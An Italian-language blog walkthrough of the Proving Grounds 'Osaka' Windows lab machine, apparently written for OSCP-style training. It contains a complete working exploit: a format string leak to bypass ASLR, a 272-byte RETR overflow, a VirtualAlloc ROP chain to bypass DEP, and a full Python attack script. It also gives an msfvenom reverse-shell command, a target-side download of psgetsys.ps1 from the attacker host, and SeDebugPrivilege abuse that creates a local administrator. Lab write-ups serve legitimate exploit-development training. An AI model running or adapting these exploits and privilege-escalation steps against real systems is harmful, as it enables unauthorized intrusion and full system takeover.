---
title: >-
  Osaka Walkthrough Proving Grounds Practice: Buffer Overflow Windows, ASLR e
  DEP Bypass, ROP Chain
slug: osaka
description: >-
  Walkthrough Osaka Proving Grounds Practice(OffSec): format string leak, ASLR
  bypass, buffer overflow, ROP chain per bypassare DEP e SeDebugPrivilege.
image: /osaka.webp
draft: false
date: 2026-03-18T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - hard
tags:
  - Proving Grounds Practice
  - Offsec Vm
---

In questo walkthrough analizziamo **Osaka**, una macchina Windows di Proving Grounds che richiede lo sviluppo di un exploit reale da zero. Non esistono scorciatoie: ASLR attivo, DEP attivo e nessun exploit pubblico.

Vedrai come ottenere RCE sfruttando un buffer overflow con leak tramite format string, bypassare DEP con una ROP chain basata su VirtualAlloc e ottenere privilegi SYSTEM tramite SeDebugPrivilege.

Questo è un esempio reale di Windows exploit development: buffer overflow Windows, ASLR bypass e DEP bypass tramite ROP chain.

👉 Lab ideale per chi si prepara a OSCP / OSCE3 e vuole padroneggiare exploit development su Windows reale.

**Difficoltà:** Hard | **OS:** Windows | **Piattaforma:** Offensive Security Proving Grounds Practice

## Cos'è un Buffer Overflow (Recap veloce)

Un buffer overflow avviene quando un programma scrive più dati di quanti un buffer possa contenere, sovrascrivendo memoria adiacente. Questo permette di corrompere lo stack, controllare l'esecuzione del programma ed eseguire codice arbitrario.

Nel caso dello stack overflow, l'obiettivo è sovrascrivere l'EIP — il registro che punta alla prossima istruzione da eseguire — per dirottare il flusso del programma verso il nostro shellcode. Leggi anche la guida completa sul [buffer overflow di windows.](https://hackita.it/articoli/windows-buffer-overflow-exploit)

***

## Registri CPU — EIP, ESP, EAX (fondamentale)

Durante un buffer overflow controlli registri critici. Ecco quelli che useremo in questa guida:

* **EIP (Instruction Pointer)** — indirizzo della prossima istruzione. È il target principale: se lo sovrascrivi, controlli il programma.
* **ESP (Stack Pointer)** — punta alla cima dello stack. Dopo il crash, ESP punta esattamente dopo il nostro payload.
* **EBP (Base Pointer)** — riferimento dello stack frame corrente.
* **EAX, EBX, ECX, EDX** — registri generici usati per operazioni e puntatori. Nella ROP chain li usiamo per passare parametri a VirtualAlloc.
* **ESI, EDI** — registri indice, usati nella chain per puntatori a funzioni.

Se sovrascrivi EIP controlli il programma. Tutto il resto — ROP chain, ASLR bypass, DEP bypass — serve per arrivare a eseguire il nostro shellcode dopo aver preso controllo di EIP.

### 64-bit — differenza con x86

Su x64 i registri si allargano ma il concetto è identico:

| x86 | x64 |
| --- | --- |
| EIP | RIP |
| ESP | RSP |
| EAX | RAX |
| EBX | RBX |

Stessa logica, registri da 64 bit invece di 32.

***

## Enumeration

```bash
sudo nmap -sV -p- 192.168.14.152
```

```
PORT     STATE SERVICE
21/tcp   open  ftp
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

La porta 21 è quella interessante. Il server FTP accetta qualsiasi credenziale.

```bash
ftp 192.168.14.152
# Username: hackita
# Password: hackita
```

```
ftp> ls
 ftp.exe        158,208 bytes
 dev.txt             29 bytes
```

Il server espone il suo stesso binario. Lo scarichiamo per analizzarlo localmente — avere il binario è fondamentale per calcolare tutti gli offset prima di toccare il target.

```
ftp> binary
ftp> get ftp.exe
```

***

## Analisi Locale — Immunity Debugger + mona

### Step 0 — Setta la cartella di lavoro

```
!mona config -set workingfolder c:\Users\hackita\Desktop\Osaka
```

### Step 1 — Controlla le protezioni

```
!mona modules -m ftp.exe
```

```
Base       | ASLR  | NXCompat | SafeSEH | Rebase
0x00a30000 | True  | False    | True    | True
```

* **ASLR True** — indirizzi casuali ad ogni avvio. Non possiamo hardcodare indirizzi. Serve un leak.
* **NXCompat False** — il binario non ha richiesto DEP. Ma Windows può forzarlo comunque — NXCompat è il flag del binario, DEP è la policy di Windows. Lo scopriamo testando.
* **SafeSEH True** — gestori di eccezioni protetti. Non ci interessa in questo exploit.

***

### Come abbiamo trovato il comando DEBUG vulnerabile

Analizzando il binario con un disassembler troviamo che il server implementa
un comando `DEBUG` non documentato. Nel codice vediamo due chiamate a sprintf:

```c
// Comando normale — format string fissa, sicuro
sub_401060(v27, "%d.%d.%d.%d", v41[0]);

// Comando DEBUG — il secondo parametro è v26, cioè il nostro input
sub_401060(&v23, v26, (char)sub_4010F0);
sub_401060(&v23, "%s\r\n", (char)&v23);
```

Nel primo caso la format string è `"%d.%d.%d.%d"` — fissa, sicura.
Nel secondo caso la format string è `v26` — cioè l'input dell'utente.

La funzione `sub_401060` è una sprintf/printf. Il secondo parametro
dovrebbe essere sempre una stringa fissa come `"%s"`. Qui invece è
direttamente l'input — classica format string vulnerability.

Per verificarlo ci colleghiamo via FTP e testiamo:

```bash
ftp 192.168.14.152
quote DEBUG %x
# risposta: DEBUG a310f0
```

Il server risponde con un indirizzo di memoria. Confermata la vulnerabilità.

## Format String Vulnerability — Teoria e Pratica

`printf("%s", input)` — sicuro. Format string fissa.

`printf(input)` — vulnerabile. L'input diventa la format string. Se passi `%x`, legge e stampa il prossimo valore sullo stack.

### I format specifier principali

| Specifier | Cosa fa                                                              |
| --------- | -------------------------------------------------------------------- |
| `%x`      | Legge 4 byte dallo stack, stampa in hex                              |
| `%d`      | Legge 4 byte dallo stack, stampa come intero                         |
| `%s`      | Legge 4 byte come puntatore, stampa la stringa a quell'indirizzo     |
| `%n`      | Scrive nello stack il numero di caratteri stampati — pericolosissimo |
| `%p`      | Come `%x` ma formato puntatore (0x...)                               |
| `%08x`    | Come `%x` con padding a 8 caratteri                                  |

### Come usiamo %x per leakare la base

Lo stack contiene indirizzi interni del programma. Mandando `%x|` ripetuto 100 volte, fotografiamo 100 valori consecutivi dallo stack:

```bash
quote DEBUG %x|%x|%x|...  # ripetuto 100 volte
```

Risposta:

```
DEBUG a310f0|7750c9b4|00000000|...
```

> **Perché `quote`?** Il client FTP filtra i comandi non standard. Con `quote` mandiamo il comando raw direttamente al server.

### Calcolo degli offset — la logica

ASLR cambia la base del programma ad ogni avvio. Ma gli offset interni sono fissi — li decide il compilatore. È come una città che si sposta ogni giorno: se il bar è sempre a 2km dalla piazza, basta sapere dove si trova la piazza.

```
!mona modules -m ftp.exe    → base: 0x00a30000
!mona jmp -r esp -m ftp.exe → jmp esp: 0x00a310da

Valore leakato %x: 0xa310f0
Offset leak:       0xa310f0 - 0xa30000 = 0x10f0  ← fisso per sempre
Offset jmp esp:    0xa310da - 0xa30000 = 0x10da  ← fisso per sempre
```

Ad ogni avvio:

```python
distanza_leak    = 0x10f0
distanza_jmp_esp = 0x10da

nuova_base    = nuovo_leak - distanza_leak
jmp_esp_reale = nuova_base + distanza_jmp_esp
```

***

## Buffer Overflow — Checklist Rapida

1. **Fuzzing** — trova quando crasha
2. **Offset** — trova quanti byte prima di sovrascrivere EIP
3. **Conferma controllo EIP** — `B*4` in EIP = `42424242`
4. **Bad chars** — trova i byte che il programma filtra
5. **JMP ESP** — trova il trampolino
6. **Shellcode** — genera il payload
7. **DEP bypass** — se DEP attivo, costruisci ROP chain
8. **Execution** — lancia e prendi la shell

***

## Buffer Overflow sul Comando RETR

### Fuzzing

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.14.152", 21))
s.recv(1024)
s.send(b"USER hackita\r\n")
s.recv(1024)
s.send(b"PASS hackita\r\n")
s.recv(1024)
s.send(b"RETR " + b"A"*500 + b"\r\n")
```

### Offset esatto

```bash
msf-pattern_create -l 500
msf-pattern_offset -q [VALORE_EIP]
# Risultato: 272
```

### Conferma controllo EIP

```python
payload = b"A"*272 + b"B"*4
# EIP = 42424242 → controllo confermato
```

### Bad Characters

```
!mona bytearray -b "\x00"
```

```python
payload = b"A"*272 + b"B"*4 + bytes(range(1, 256))
```

```
!mona compare -f bytearray.bin -a [INDIRIZZO_ESP]
→ Hooray, normal shellcode unmodified
→ Bytes omitted: 00
```

Solo `\x00` come bad char.

### Primo tentativo senza ROP — fallisce

```python
payload = b"A"*272 + jmp_esp_reale.to_bytes(4,'little') + b"\x90"*16 + shellcode
```

EIP salta su ESP ma lo shellcode non esegue. **DEP è attivo.** Serve ROP.

***

## ROP Chain — Teoria Completa

### Cos'è DEP

DEP divide la memoria in dati (stack) ed eseguibile (codice del binario). Lo stack è dati — qualsiasi esecuzione viene bloccata.

### Cos'è una ROP Chain

ROP usa gadget — piccoli frammenti di codice già presenti nel binario che terminano con `RETN`. `RETN` prende il valore in cima allo stack e ci salta. Se controlli lo stack, controlli la catena.

> **POP vs JMP:** `POP registro` carica un valore nel registro — non esegue nulla, prepara solo. `JMP indirizzo` salta ed esegue. Prima usiamo i `POP` per preparare i registri, poi i `JMP` per eseguire.

### Perché VirtualAlloc

VirtualAlloc è una Windows API (`kernel32.dll`) che alloca nuova memoria con permessi di esecuzione. Ci mettiamo lo shellcode lì — fuori dallo stack, dove DEP non blocca nulla.

### Come funziona PUSHAD

`PUSHAD` spinge tutti i registri sullo stack in ordine fisso: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI. VirtualAlloc legge i parametri in questo ordine. Dobbiamo caricare i valori giusti nei registri giusti prima di PUSHAD.

***

## Generazione della ROP Chain

```
!mona rop -m ftp.exe
```

XML completo generato da mona:

```xml
<gadgets base="0x00a30000">
  <gadget offset="0x00005181">POP ECX # RETN</gadget>
  <gadget offset="0x0001e008">ptr to VirtualAlloc()</gadget>
  <gadget offset="0x00009a8f">MOV EAX,DWORD PTR DS:[ECX] # RETN</gadget>
  <gadget offset="0x0000c9d6">POP ESI # RETN</gadget>
  <gadget value="0xffffffff"/>
  <gadget offset="0x0000e5eb">INC ESI # ADD AL,5E # RETN</gadget>
  <gadget offset="0x00004336">ADD ESI,EAX # INC ECX # ADD AL,0 # POP EDI # POP EBP # RETN</gadget>
  <gadget value="junk">Filler</gadget>
  <gadget offset="0x00007e14">POP EBP # RETN</gadget>
  <gadget offset="0x000010da">jmp esp</gadget>
  <gadget offset="0x000013bf">POP EBX # RETN</gadget>
  <gadget value="0x00000001">0x00000001 -> ebx</gadget>
  <gadget offset="0x0001bd7e">POP EDX # RETN</gadget>
  <gadget value="0x00001000">0x00001000 -> edx</gadget>
  <gadget offset="0x00005181">POP ECX # RETN</gadget>
  <gadget value="0x00000040">0x00000040 -> ecx</gadget>
  <gadget offset="0x00004655">POP EDI # RETN</gadget>
  <gadget offset="0x00004682">RETN (ROP NOP)</gadget>
  <gadget offset="0x0001d2bf">POP EAX # RETN</gadget>
  <gadget value="0x90909090">nop</gadget>
  <gadget offset="0x000010d6">PUSHAD # RETN</gadget>
</gadgets>
```

### Perché non usiamo la chain standard (righi 8-15)

I righi 8-15 sono la chain standard per caricare VirtualAlloc in ESI in modo indiretto: POP ECX → MOV EAX,\[ECX] → INC ESI → ADD ESI,EAX. L'abbiamo testata — non funziona.

Inoltre al rigo 27 il valore sotto `POP EAX` è `0x90909090` — un NOP inutile. EAX conterrebbe spazzatura.

### La soluzione — JMP \[EAX]

`JMP [EAX]` salta all'indirizzo contenuto in EAX. Se EAX ha il puntatore a VirtualAlloc, `JMP [EAX]` ci porta direttamente lì. Non è nell'XML di mona — va cercato a mano:

```
!mona find -s "\xff\x20" -m ftp.exe
→ 0x00a44adb  (offset: 0x14adb)
```

`\xff\x20` sono i byte di `JMP [EAX]` in assembly.

### Cosa abbiamo tenuto e cosa abbiamo scartato

**Scartato — righi 8-15** (chain standard che non funziona)

**Modificato:**

* Rigo 27 — il NOP sotto `POP EAX` diventa `0x1e008` (puntatore a VirtualAlloc)
* Rigo 11 — `POP ESI` tenuto ma con valore `JMP [EAX]` al posto di `0xffffffff`

**Il meccanismo ESI + EAX:**

```
POP ESI → ESI = JMP [EAX]  (indirizzo 0x14adb in ftp.exe)
POP EAX → EAX = ptr VirtualAlloc  (0x1e008)
```

POP non esegue nulla — prepara i registri. È PUSHAD che innesca tutto. Quando parte la catena, `JMP [EAX]` tramite ESI salta al valore di EAX — cioè a VirtualAlloc.

Stesso meccanismo di EIP → JMP ESP → shellcode. Solo un livello sopra: ESI → JMP \[EAX] → EAX → VirtualAlloc.

### Chain finale con i nostri offset

```python
rop_gadgets = [
    0x7e14  + nuova_base,  # POP EBP
    0x7e14  + nuova_base,  # skip 4 bytes
    0x13bf  + nuova_base,  # POP EBX
    0x1,                   # EBX = 1
    0x1bd7e + nuova_base,  # POP EDX
    0x1000,                # EDX = 0x1000 (size)
    0x5181  + nuova_base,  # POP ECX
    0x40,                  # ECX = 0x40 (PAGE_EXECUTE_READWRITE)
    0x4655  + nuova_base,  # POP EDI
    0x4682  + nuova_base,  # RETN NOP (valore EDI)
    0xc9d6  + nuova_base,  # POP ESI
    0x14adb + nuova_base,  # JMP [EAX] — da !mona find (valore ESI)
    0x1d2bf + nuova_base,  # POP EAX
    0x1e008 + nuova_base,  # ptr VirtualAlloc — dall'XML (valore EAX)
    0x10d6  + nuova_base,  # PUSHAD
    0x10da  + nuova_base,  # JMP ESP
]
```

***

### ![](/rop_chain_flow%20\(1\).svg)

## Exploit Completo

### Genera lo shellcode

```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp \
  LHOST=10.10.10.10 LPORT=4444 -b "\x00" -f py
```

### Script finale

```python
import socket
from struct import pack

distanza_leak    = 0x10f0
distanza_jmp_esp = 0x10da

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.14.152", 21))
s.recv(1024)

s.send(b"USER hackita\r\n")
s.recv(1024)
s.send(b"PASS hackita\r\n")
s.recv(1024)

# ASLR Bypass
s.send(b"DEBUG " + b"%x|"*100 + b"\r\n")
leak = s.recv(1024)
leak_value = int(leak.split(b"|")[0].split(b" ")[-1], 16)
nuova_base    = leak_value - distanza_leak
jmp_esp_reale = nuova_base + distanza_jmp_esp
print(f"Leak:          {hex(leak_value)}")
print(f"Nuova base:    {hex(nuova_base)}")
print(f"jmp esp reale: {hex(jmp_esp_reale)}")

buf = b""
buf += b"[SOSTITUIRE CON IL PROPRIO SHELLCODE]"

rop_gadgets = [
    0x7e14  + nuova_base,
    0x7e14  + nuova_base,
    0x13bf  + nuova_base,
    0x1,
    0x1bd7e + nuova_base,
    0x1000,
    0x5181  + nuova_base,
    0x40,
    0x4655  + nuova_base,
    0x4682  + nuova_base,
    0xc9d6  + nuova_base,
    0x14adb + nuova_base,
    0x1d2bf + nuova_base,
    0x1e008 + nuova_base,
    0x10d6  + nuova_base,
    0x10da  + nuova_base,
]

rop = b""
for g in rop_gadgets:
    rop += pack("<I", g)

total = 1000
payload  = b"A"*272
payload += rop
payload += b"\x90"*16
payload += buf
payload += b"B"*(total - len(payload))

input("Listener pronto? premi invio...")
s.send(b"RETR " + payload + b"\r\n")
```

### Listener

```bash
nc -lvnp 4444
```

Shell come `osaka\wilson`.

***

## Privilege Escalation — SeDebugPrivilege

```
C:\dev> whoami /priv
SeDebugPrivilege    Debug programs    Enabled
```

`SeDebugPrivilege` permette di iniettare codice in processi SYSTEM come `winlogon.exe`.

**Su Kali:**

```bash
wget https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1
python3 -m http.server 8000
```

**Sul target:**

```powershell
powershell -c "Invoke-WebRequest http://10.10.10.10:8000/psgetsys.ps1 -OutFile psgetsys.ps1"
powershell -c "Import-Module .\psgetsys.ps1"
powershell -c "Get-Process winlogon"
# PID: 544
```

```powershell
powershell -c "[MyProcess]::CreateProcessFromParent('544', 'c:\windows\system32\cmd.exe', '/c net user hackita Start123! /add')"
powershell -c "[MyProcess]::CreateProcessFromParent('544', 'c:\windows\system32\cmd.exe', '/c net localgroup administrators hackita /add')"
```

```bash
rdesktop 192.168.14.152 -u hackita -p Start123!
```

SYSTEM ottenuto.

***

## Riepilogo Tecnico

| Protezione | Stato                       | Bypass                            |
| ---------- | --------------------------- | --------------------------------- |
| ASLR       | Attivo                      | Format String Leak via `DEBUG %x` |
| DEP        | Attivo (forzato da Windows) | ROP Chain + VirtualAlloc          |
| SafeSEH    | Attivo                      | Non sfruttato                     |

| Step              | Tecnica                                           |
| ----------------- | ------------------------------------------------- |
| Leak base address | `DEBUG %x\|` x100 — offset 0x10f0                 |
| BOF offset        | 272 byte — msf-pattern                            |
| Bypass DEP        | ROP chain con JMP \[EAX] + VirtualAlloc           |
| Shellcode         | VirtualAlloc → PAGE\_EXECUTE\_READWRITE → JMP ESP |
| Privesc           | SeDebugPrivilege + psgetsys.ps1                   |

***

## Concetti Chiave

**Format String Vulnerability** — `printf(input)` invece di `printf("%s", input)`. Con `%x` leggi valori dallo stack. Con `%x` ripetuto fotografi indirizzi interni del programma.

**ASLR** — randomizza solo la base. Gli offset interni sono fissi — li decide il compilatore. Leakato la base, sai dove si trova tutto.

**NXCompat vs DEP** — NXCompat è il flag del binario. DEP è la policy di Windows. Windows vince sempre.

**ROP Chain** — gadget già nel binario, ognuno termina con RETN. POP prepara i registri senza eseguire nulla. JMP salta ed esegue. PUSHAD innesca la catena.

**VirtualAlloc** — Windows API che alloca memoria eseguibile fuori dallo stack. DEP non blocca quella memoria. Lo shellcode ci va dentro e viene eseguito.

**ESI + EAX + JMP \[EAX]** — ESI contiene `JMP [EAX]`. EAX contiene il puntatore a VirtualAlloc. Quando la chain esegue, `JMP [EAX]` porta direttamente a VirtualAlloc. Stesso meccanismo di EIP → JMP ESP → shellcode, ma un livello sopra.

***

## Formazione HackIta

Vuoi diventare realmente forte su exploit development e OSCP?

Visita [https://hackita.it/servizi](https://hackita.it/servizi)

Testiamo anche la sicurezza della tua azienda.

Supporta HackIta: [https://hackita.it/supporto](https://hackita.it/supporto)

***

*Walkthrough scritto a scopo educativo per Hackita. Testa solo su macchine di tua proprietà o su piattaforme autorizzate come Proving Grounds.*

### 🔗 Risorse HackIta

* Guida completa Active Directory\
  [https://hackita.it/articoli/active-directory/](https://hackita.it/articoli/active-directory/)
* Buffer Overflow guida\
  [https://hackita.it/articoli/buffer-overflow/](https://hackita.it/articoli/buffer-overflow/)
* ROP Chain spiegazione\
  [https://hackita.it/articoli/rop-chain/](https://hackita.it/articoli/rop-chain/)

***

## 🚀 Formazione e Servizi

Vuoi diventare davvero forte nel pentesting, prepararti per OSCP o testare la sicurezza della tua azienda?

👉 Formazione 1:1 e servizi di sicurezza\
[https://hackita.it/servizi](https://hackita.it/servizi)

Se vuoi supportare il progetto HackIta:

👉 Supporta il progetto\
[https://hackita.it/supporto](https://hackita.it/supporto)
